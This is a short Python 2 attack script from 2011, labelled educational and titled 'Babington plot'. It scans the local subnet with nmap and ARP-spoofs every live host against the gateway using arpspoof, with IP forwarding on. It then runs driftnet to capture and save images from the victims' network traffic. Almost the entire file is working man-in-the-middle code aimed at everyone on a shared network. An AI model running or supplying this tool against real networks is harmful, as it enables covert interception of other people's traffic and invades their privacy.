######################################################################################### 
#Babington plot'

# Uses python-nmap, driftnet (sudo apt-get install nmap python-nmap driftnet)

# Python nmap: http://xael.org/norman/python/python-nmap/
# Driftnet: http://www.ex-parrot.com/~chris/driftnet/
# Arpspoof: http://arpspoof.sourceforge.net/

# Joao Wilbert - 2011
# Code developed for educational purposes

######################################################################################### 

import commands
import os
import socket
import fcntl
import struct
import nmap
import subprocess
import interface

SIOCGIFNETMASK = 0x891b

NINTERFACE = "eth0" # Enter your network interface 
DIR = "/home/jhwilbert/Workspace/captured" # Enter the directory to save images

######################################################################################### 
# Class Definition

class babington():

    def ip_fwd(self):
        ipfwd = commands.getoutput('cat  /proc/sys/net/ipv4/ip_forward')
        if ipfwd == '0':
            commands.getoutput('echo 1 > /proc/sys/net/ipv4/ip_forward')
            print "Enabling IP Forwarding..."        
        if ipfwd == '1':
            print "IP forward enabled"
        return True

    def get_local_ip(self):
        
        # Get localhost current IP
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        localip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', NINTERFACE[:15])
        )[20:24])
        
        print "LOCAL IP IS:"+ localip
        
        return localip

    def get_gateway(self):
        
        # Find localhost's gateway
        
        cmd = "ip route list dev "+ NINTERFACE + " | awk ' /^default/ {print $3}'"
        fin,fout = os.popen4(cmd)
        result = fout.read()
        
        print "GATEWAY IS:" + result
        return result

    def nmap_network(self,gateway):        
        
        # Format Gateway string
        
        gatewayPath = gateway[0:-1]
        gateList = gatewayPath.split(".")
        gateRange = len(gateList) - 1
        gateList[gateRange] = "0/24"
        gateString = '.'.join(gateList)
        
        print "MAPPING NETWORK..."
        
        # Scan for alive hosts
        nm = nmap.PortScanner()   
        nm.scan(hosts=gateString, arguments='-sF')
        hosts_list = [(x, nm[str(x)]['status']['state']) for x in nm.all_hosts()]
        
        upList = []
        
        for host, status in hosts_list:
            if status == 'up':
                upList.append(host)
                
        upList.pop(0) #remove first item that is the router
            #print('{0}:{1}'.format(host, status))
        
        return upList

    def apply_drift(self,gateway, hosts):
        
        index = 0
        processes_in = []
        processes_out = []
        for host in hosts:
            subprocess.Popen("sudo arpspoof -i "+NINTERFACE+" -t "+host+" "+ gateway, shell=True)
            subprocess.Popen("sudo arpspoof -i "+NINTERFACE+" -t "+gateway+" "+ host, shell=True)
        return True

    def start_drift(self):
        cmd = "driftnet -v -i "+NINTERFACE+" -a -d " + DIR
        subprocess.Popen(cmd, shell=True)
######################################################################################### 
# Class Instance

session = babington()

if(session.ip_fwd()):
    if(session.apply_drift(session.get_gateway(),session.nmap_network(session.get_gateway()))):
        session.start_drift()

# Checkers
#print session.ip_fwd()
#print session.nmap_network(session.get_gateway())
#print session.get_local_ip()
#print session.nmap_network(session.get_gateway())